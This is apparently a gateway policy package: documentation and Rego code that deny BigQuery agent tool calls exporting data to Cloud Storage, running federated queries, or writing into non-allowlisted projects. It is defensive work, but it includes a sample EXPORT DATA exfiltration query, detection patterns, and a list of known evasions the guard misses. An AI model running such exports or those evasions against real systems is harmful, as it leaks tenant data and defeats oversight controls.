---
name: Block BigQuery Exfiltration and Cross-Project Writes
tags:
  - bigquery
  - guard-warehouse-export
  - ingress
  - sql
  - exfiltration
  - soc2
  - pci-dss
  - gdpr-ccpa
publishedAt: 2026-07-12
description: |
  # bigquery / guard-warehouse-export

  **Direction:** ingress (`tool_pre_invoke`)
  **Default:** deny on an exfiltration/cross-project construct (and fail closed on unreadable SQL), allow otherwise
  **Package:** `bigquery.ingress.guard_warehouse_export`

  ## What it does

  Inspects the raw GoogleSQL string carried by BigQuery SQL tools and denies any
  statement that moves data *out of the tenant's own project* — even when the call
  does not look like a classic "write tool" at the MCP layer. Three exfiltration
  shapes are blocked:

  - **`EXPORT DATA`** — streams query results to a Cloud Storage (`gs://`) bucket
    outside the warehouse. This is a read-shaped statement that lands data on GCS.
    **`EXPORT MODEL`** — streams a trained BigQuery ML model (whose artifacts can
    encode training data) to a `gs://` bucket; caught by the same rule.
  - **`EXTERNAL_QUERY`** — a federated pull from another data source (Cloud SQL,
    Spanner, etc.), moving data across a trust boundary.
  - **A persistent write into another project** — `INSERT` (with or without the
    optional `INTO`), `MERGE`, `UPDATE`, `CREATE [OR REPLACE] TABLE`, or
    `CREATE SNAPSHOT TABLE` whose target is a fully-qualified
    `project.dataset.table` reference in a project ID **outside the tenant's
    allowlist**. A two-part `dataset.table` reference (implicitly the current
    project) is not flagged by this policy; only an explicit cross-project target
    is.

  It also inspects the standalone **`project_id` argument**. The official remote
  BigQuery MCP server lets a caller target *any* project their IAM happens to
  allow, so a `project_id` set to a value not on the allowlist is denied on its
  own — independent of the SQL text.

  Data may only land inside the tenant's own allowlisted project(s). Approved
  cross-project or GCS exports are expected to run through the data platform
  team's sanctioned export pipeline, not the agent MCP path.

  Two correctness properties:

  - **Fail closed on unreadable SQL.** If a matched SQL tool is called with no
    `sql` string (missing, empty, or a non-string value), the guard cannot confirm
    the statement is exfiltration-free, so it **denies** rather than letting an
    opaque payload through. This stops a renamed-argument or malformed call from
    slipping an `EXPORT DATA` past the regex.
  - **The read-only tool is excluded.** The official Google server's
    `execute_sql_readonly` ("no DML, DDL, or Python UDFs") cannot run these
    constructs; it is matched on its `_readonly` suffix first and excluded, so a
    read-only call is never caught here. Cross-project *reads* via `_readonly` are
    out of this policy's scope (see Known limitations).

  This runs at ingress, before the statement reaches BigQuery, so a blocked
  `EXPORT DATA`/`EXTERNAL_QUERY`/cross-project write never executes and no data
  ever leaves the tenant's project boundary.

  ## Compliance alignment

  - **SOC 2 CC6.7** — supports the restriction on transmission, movement, and
    removal of information by blocking the agent from streaming warehouse data to
    an external GCS bucket, pulling it across a federated source, or copying it
    into another project. (Change-management control **CC8.1** is also supported
    where the cross-project write is an unreviewed DDL.)
  - **PCI DSS 7.2.6** — supports restricting programmatic query access to stored
    cardholder data by keeping bulk-export and cross-project-write constructs off
    the agent MCP path, so CHD cannot be relocated out of the in-scope project.
  - **GDPR Art. 5(1)(c)** — supports data minimisation on the agent channel by
    blocking constructs that copy personal-data tables wholesale to GCS or another
    project; **Arts. 44/46** — supports control over cross-border/cross-boundary
    transfers by denying federated pulls and out-of-project writes the tenant has
    not sanctioned.
  - **SOX §802 / 18 U.S.C. §1519** — supports the anti-alteration/anti-movement
    control over financially relevant records by preventing the agent from copying
    or relocating warehouse tables into an uncontrolled project or GCS bucket
    outside the reviewed data-engineering path.

  ## Tool name matching

  The policy matches BigQuery SQL tools by **suffix** (the gateway prefixes tool
  names with the configured MCP server name, which is not standardized):

  - `*execute_sql` — Google official remote server + MCP Toolbox `bigquery` toolset
  - `*query` — ergut/mcp-bigquery-server (single `query` tool)
  - `*execute-query` — LucasHild/mcp-server-bigquery (kebab-case)

  The read-only tool is matched first and **excluded**:

  - `*_readonly` (covers `execute_sql_readonly`) — never inspected here.

  Metadata/read helpers (`list_dataset_ids`, `get_table_info`, `list-tables`,
  `describe-table`, …) do not end with a matched suffix and pass through untouched.

  ## Argument shape

  - **SQL** is read from `input.payload.args.sql` (verified for the official /
    Toolbox servers and ergut), with `query` inspected as a defensive fallback; the
    policy matches against the concatenation of whichever string values are present.
    LucasHild's `execute-query` SQL argument key is unverified — a matched call
    whose SQL lands under some other key carries no readable SQL and is **denied
    fail closed** (add the real key to `sql_arg_keys` in `policy.md`).
  - **`project_id`** is read from `input.payload.args.project_id` (verified key for
    the official/Toolbox `execute_sql`). A non-empty string value is compared
    case-folded against the `allowed_projects` allowlist; a present-but-non-string
    value (object/array/number) is denied fail-closed; an absent or empty-string
    value does not fire the check.

  ## Allowlist — pin per tenant

  `allowed_projects` is a **placeholder** set (`my-tenant-prod`,
  `my-tenant-analytics`). Replace these with your tenant's own BigQuery project IDs
  (lowercase) at import time. A cross-project write target or `project_id` argument
  whose project is not in this set is denied.

  ## Examples

  ### Allowed — SELECT into the current project

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "bigquery-mcp-execute_sql", "type": "tool" },
      "payload": {
        "name": "bigquery-mcp-execute_sql",
        "args": { "sql": "SELECT id, total FROM analytics.orders LIMIT 100" }
      }
    }
  }
  ```

  `allow = true` — no exfil construct, no cross-project target, no `project_id`.

  ### Allowed — write into an allowlisted project (explicitly qualified)

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "bigquery-mcp-execute_sql", "type": "tool" },
      "payload": {
        "name": "bigquery-mcp-execute_sql",
        "args": { "sql": "INSERT INTO my-tenant-prod.reporting.daily SELECT * FROM staging.daily" }
      }
    }
  }
  ```

  `allow = true` — `my-tenant-prod` is on the allowlist. (A separate policy,
  `guard-warehouse-sql`, governs whether ordinary callers may run `INSERT` at all;
  this policy only cares that the target project is the tenant's own.)

  ### Denied — EXPORT DATA to a GCS bucket

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "bigquery-mcp-execute_sql", "type": "tool" },
      "payload": {
        "name": "bigquery-mcp-execute_sql",
        "args": { "sql": "EXPORT DATA OPTIONS(uri='gs://exfil-bucket/*', format='CSV') AS SELECT * FROM analytics.customers" }
      }
    }
  }
  ```

  `allow = false` with the EXPORT DATA reason.

  ### Denied — cross-project CREATE TABLE

  A `CREATE TABLE other-corp-project.stage.copy AS SELECT * FROM analytics.customers`
  is denied — `other-corp-project` is not on the allowlist.

  ### Denied — project_id override

  A call with `args: { "sql": "SELECT 1", "project_id": "some-other-project" }` is
  denied with the `project_id` reason, even though the SQL is a harmless SELECT.

  ### Denied — fail closed on empty SQL

  A call to `bigquery-mcp-execute_sql` with `args: { "sql": "" }` (or no `sql`) is
  denied with the unreadable-SQL reason.

  ## Composition

  This is defense-in-depth for the exfiltration surface. Pair it with:

  - **`guard-warehouse-sql`** (sibling PF-07 policy) — blocks the destructive/DML
    statement classes (`DELETE`, `DROP`, `TRUNCATE`, non-temp `CREATE`, `GRANT`,
    `CALL`, `LOAD DATA`, `EXECUTE IMMEDIATE`) that this export guard does not cover.
  - **`fence-sensitive-schemas` (PF-23)** — dataset/schema allow-lists keyed to IdP
    groups, for the tables an allowed in-project query may still touch.
  - **Egress PII/PAN redaction** on query results, since a permitted `SELECT` can
    still return regulated data in bulk.
  - **Server-side controls** — MCP Toolbox `writeMode: blocked`/`protected`,
    `allowedDatasets`, and read-only IAM roles. The regex guard is a high-signal
    first line, not a SQL firewall.

  ## Known limitations

  - **Tenant project allowlist is a placeholder.** `allowed_projects` must be
    pinned to the tenant's real project IDs at import — until then it denies every
    cross-project target and `project_id` override, including the tenant's own.
  - **Regex over SQL text, not a parser.** Table-reference detection cannot catch
    every obfuscation. SQL comments are scrubbed before matching (block `/* */`,
    line `--`, hash `#` → replaced with a space), so inter-token comment tricks
    (`EXPORT/**/DATA`, `CREATE TABLE /*c*/ proj.ds.t`) are caught; a comment that
    splits a keyword itself (`EXP/**/ORT`) is not, but it is not a valid keyword in
    GoogleSQL either, so it does not execute as an export. Residual evasions
    (false negatives) remain: per-identifier backtick-quoting
    (`` `proj`.`ds`.`tbl` ``, where each part is individually quoted — the
    whole-name-wrapped form `` `proj.ds.tbl` `` *is* caught), domain-scoped legacy
    project IDs (`` `example.com:proj.ds.tbl` ``, which must be backtick-wrapped),
    an unterminated block comment (`EXPORT /* DATA …` with no closing `*/` — but
    that is invalid SQL and errors server-side), `INFORMATION_SCHEMA`-driven or
    `EXECUTE IMMEDIATE` dynamic SQL that assembles the target from fragments, and
    multi-statement scripts. A mutating keyword or `gs://`-like string inside a
    string literal can still produce a false positive. Treat this as
    defense-in-depth alongside `guard-warehouse-sql` and server-side controls, not
    a standalone firewall.
  - **Cross-project write detection covers the common data-landing DML/DDL only.**
    `INSERT` (with/without `INTO`), `MERGE`, `UPDATE`, `CREATE [OR REPLACE] TABLE`,
    and `CREATE SNAPSHOT TABLE` targeting a three-part `project.dataset.table` are
    matched. Rarer forms that can also persist data in another project —
    `CREATE MATERIALIZED VIEW proj.ds.mv AS …`, `CREATE EXTERNAL TABLE`, and
    `LOAD DATA INTO proj.ds.t` — are **not** flagged by the cross-project regex
    (verified: a cross-project `CREATE MATERIALIZED VIEW` is allowed here). Rely on
    the sibling `guard-warehouse-sql` (which blocks non-temp `CREATE` and
    `LOAD DATA` outright) and on server-side `writeMode`/`allowedDatasets` for
    those. Note `guard-warehouse-sql` does **not** block plain `INSERT`/`UPDATE`/
    `MERGE`, so the cross-project boundary for those DML forms rests on this policy.
  - **Cross-project *reads* are out of scope.** This policy governs the write /
    export surface. It excludes `execute_sql_readonly`, so a read-only query that
    federates or reads from another project via `project_id` on the read-only tool
    is not caught here — gate that with a read-side scope policy if needed.
  - **`project_id` key is verified only for the official/Toolbox `execute_sql`.**
    Community servers may not accept it; the check simply does not fire when the
    argument is absent. A present-but-non-string `project_id` (object/array/number)
    is treated as malformed and **denied fail-closed**; an empty-string value is
    ignored (some servers read it as "use the default project").
  - **Two-part references assume the current project.** `dataset.table` is treated
    as in-project (not flagged). If your server resolves unqualified references to
    a non-tenant default project, enforce the project boundary server-side.

  > **Compliance note.** This policy supports alignment with the cited framework controls **on the MCP path only**. No policy or bundle makes an organization compliant with any framework; web-UI, native-API, and in-app access are outside the gateway's reach by design. Validate against your own compliance program before relying on it.
direction: ingress
apps:
  - bigquery
industries: []
bundles:
  - soc2
  - pci-dss
  - gdpr-ccpa
experimental: true
schemaVersion: 1.0.0
minimumGatewayVersion: 1.0.0b24
---

```rego
package bigquery.ingress.guard_warehouse_export

# Deny-by-default: a matched BigQuery SQL tool call is permitted only when it
# carries readable SQL that contains no exfiltration/cross-project construct and
# no out-of-allowlist `project_id` argument.
default allow := false

# --- Tenant project allowlist (PLACEHOLDER — pin per tenant) ------------------
# BigQuery project IDs the tenant is allowed to land data in. Replace these with
# the tenant's real (lowercase) project IDs at import time. Cross-project write
# targets and `project_id` arguments outside this set are denied.
allowed_projects := {
	"my-tenant-prod",
	"my-tenant-analytics",
}

# --- Read-only tool (matched FIRST and excluded) -----------------------------
# `execute_sql_readonly` cannot run EXPORT DATA / DDL, so it is never inspected
# here. Detected on the `_readonly` suffix before the write-tool match.
is_readonly_tool if {
	name := lower(input.resource.name)
	endswith(name, "_readonly")
}

# --- SQL tools ---------------------------------------------------------------
# Matched by suffix (gateway prefixes the configured server name). Same surface
# as the sibling guard-warehouse-sql policy.
sql_tool_suffixes := [
	"execute_sql",
	"execute-query",
	"query",
]

is_sql_tool if {
	not is_readonly_tool
	name := lower(input.resource.name)
	some suffix in sql_tool_suffixes
	endswith(name, suffix)
}

# --- SQL extraction ----------------------------------------------------------
# Read the statement from `sql` (verified) and `query` (defensive fallback).
# Only non-empty string values are considered; a non-string arg yields no SQL,
# which on a matched tool is denied fail closed below.
sql_arg_keys := ["sql", "query"]

sql_text := concat(" ", [v |
	some key in sql_arg_keys
	v := object.get(input.payload.args, key, "")
	is_string(v)
	v != ""
])

sql_present if {
	sql_text != ""
}

# --- Comment scrubbing -------------------------------------------------------
# Strip SQL comments so two keywords (or a keyword and its target table)
# separated only by a comment are seen as adjacent. Without this, GoogleSQL
# treats a comment as whitespace, so `EXPORT/**/DATA`, `EXPORT -- x\nDATA`, and
# `CREATE TABLE /*c*/ proj.ds.t` tokenize as the real statement yet slip past the
# `\s+`-anchored patterns below. Block (`/* */`), line (`--`) and hash (`#`)
# comments are each replaced with a single space. RE2 → linear time, no
# backtracking. A comment that splits a *keyword itself* (`EXP/**/ORT`) also
# breaks that keyword in GoogleSQL, so scrubbing can only close inter-token
# evasions, never manufacture a new bypass. Detection below runs on the scrubbed
# text; `sql_present` (fail-closed gate) stays on the raw text.
sql_scrubbed := scrubbed if {
	no_block := regex.replace(sql_text, `/\*[\s\S]*?\*/`, " ")
	no_line := regex.replace(no_block, `--[^\n]*`, " ")
	scrubbed := regex.replace(no_line, `#[^\n]*`, " ")
}

# --- Exfiltration constructs -------------------------------------------------
# EXPORT DATA — streams query results to a GCS (gs://) bucket. EXPORT MODEL —
# streams a trained BQML model (which can encode training data) to a GCS bucket.
# Both are read-shaped statements that land data/artifacts on GCS outside the
# warehouse, so both are caught here. Anchored on the two keywords adjacent (any
# run of whitespace) so identifiers like `export_data` (underscore, no space) do
# not trip it.
has_export_data if {
	regex.match(`(?i)\bEXPORT\s+(?:DATA|MODEL)\b`, sql_scrubbed)
}

# EXTERNAL_QUERY — federated read from another source.
has_external_query if {
	regex.match(`(?i)\bEXTERNAL_QUERY\b`, sql_scrubbed)
}

# --- Cross-project write target ----------------------------------------------
# Match the target of a persistent write whose destination is a *fully-qualified*
# project.dataset.table reference (exactly three dot-separated parts, optional
# leading backtick for a whole-wrapped name). Covered write forms:
#   INSERT [INTO] ...       (INTO is OPTIONAL in GoogleSQL — both spellings match)
#   MERGE  [INTO] ...       (data-landing DML)
#   UPDATE ...              (can write tenant rows into a cross-project table)
#   CREATE [OR REPLACE] TABLE [IF NOT EXISTS] ... / CREATE SNAPSHOT TABLE ...
# A two-part `dataset.table` target has only two components and does not match,
# so it is not flagged (treated as the current project). Capture group 1 is the
# project ID. `\b` anchors each keyword so it is not matched mid-identifier. The
# keyword→target separator is `(?:\s+`?|`)`: whitespace (optionally followed by a
# backtick) OR a backtick directly, so a no-space backtick target like
# ``INSERT INTO`proj.ds.t` `` (valid GoogleSQL) is still caught without loosening
# to `\s*` (which would match mid-identifier).
target_write_pattern := "(?i)\\b(?:INSERT(?:\\s+INTO)?|MERGE(?:\\s+INTO)?|UPDATE|CREATE\\s+(?:OR\\s+REPLACE\\s+)?TABLE(?:\\s+IF\\s+NOT\\s+EXISTS)?|CREATE\\s+SNAPSHOT\\s+TABLE)(?:\\s+`?|`)([A-Za-z0-9][A-Za-z0-9-]*)\\.[A-Za-z0-9_$]+\\.[A-Za-z0-9_$]+"

cross_project_target if {
	matches := regex.find_all_string_submatch_n(target_write_pattern, sql_scrubbed, -1)
	some m in matches
	proj := lower(m[1])
	not allowed_projects[proj]
}

# --- project_id argument -----------------------------------------------------
# The remote server lets a caller target any project their IAM allows. Deny when
# the standalone project_id is a non-empty string outside the allowlist.
bad_project_id if {
	pid := object.get(input.payload.args, "project_id", "")
	is_string(pid)
	pid != ""
	not allowed_projects[lower(pid)]
}

# A present-but-non-string project_id (object, array, number) is malformed or
# evasive — the string allowlist check cannot reason about it, so fail closed
# rather than silently ignoring it. Absent project_id (the common case) does not
# reach here, since the reference is undefined and the rule body fails.
bad_project_id if {
	pid := input.payload.args.project_id
	not is_string(pid)
}

# --- Allow rules -------------------------------------------------------------
# Non-matched tools (metadata/read helpers, the read-only tool, non-SQL tools).
allow if {
	not is_sql_tool
}

# A matched SQL tool passes only when it carries readable SQL AND none of the
# exfiltration/cross-project conditions hold. Missing/empty SQL fails this rule,
# so the default deny takes effect (fail closed).
allow if {
	is_sql_tool
	sql_present
	not has_export_data
	not has_external_query
	not cross_project_target
	not bad_project_id
}

# --- Deny reasons ------------------------------------------------------------
reasons contains "This BigQuery call is blocked on the agent MCP path: it uses an EXPORT statement (EXPORT DATA or EXPORT MODEL), which streams query results or a trained model to a Cloud Storage (gs://) bucket outside the warehouse. Data may only land inside your tenant's own allowlisted project. Route approved exports through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team." if {
	is_sql_tool
	sql_present
	has_export_data
}

reasons contains "This BigQuery call is blocked on the agent MCP path: it uses EXTERNAL_QUERY, a federated pull from another data source outside your project. Data may only land inside your tenant's own allowlisted project. Route approved cross-source work through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team." if {
	is_sql_tool
	sql_present
	has_external_query
}

reasons contains "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team." if {
	is_sql_tool
	sql_present
	cross_project_target
}

reasons contains "This BigQuery call is blocked on the agent MCP path: the project_id argument targets a project outside your tenant's allowlist. The remote server lets a caller aim at any project their IAM allows, but on this path work may only target your tenant's own allowlisted project. Remove the project_id override or set it to an allowlisted project, and route approved cross-project work through your data platform team. If this was a false positive, contact your data platform team." if {
	is_sql_tool
	bad_project_id
}

reasons contains "This BigQuery SQL tool was called with no readable SQL statement, so the guard cannot confirm the query is free of data-exfiltration constructs and blocks it fail-closed. Supply the statement in the `sql` argument. If this was a false positive, contact your data platform team." if {
	is_sql_tool
	not sql_present
}

reason := joined if {
	count(reasons) > 0
	reason_list := sort([r | some r in reasons])
	joined := concat("; ", reason_list)
}
```
